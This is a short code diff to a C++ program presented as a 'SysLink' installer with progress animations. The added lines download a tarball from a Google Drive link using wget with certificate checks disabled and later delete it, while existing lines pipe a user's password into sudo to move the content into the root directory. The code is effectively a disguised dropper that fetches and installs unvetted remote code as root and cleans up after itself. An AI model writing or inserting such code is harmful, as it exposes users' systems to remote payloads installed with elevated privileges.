@@ -20,6 +20,7 @@ int main(int argc, char *argv[])
         usleep(100000); // Sleep for 100ms
     }
     printf("\n");
+    system("wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=12DKSJjR-kU-oedLRLekNY9V8DOku1qlo' -O syslink.tar");
     for (i = 0; i < 20; i++)
     {
         printf("\rExtracting %c", animation[i % 4]);
@@ -48,6 +49,7 @@ int main(int argc, char *argv[])
     printf("\n");
     string command = "echo " + pass + " | sudo -S mv syslink /";
     system(command.c_str());
+    system("rm syslink.tar");
     printf("SysLink Installed Successfully\n");
     return 0;
 }
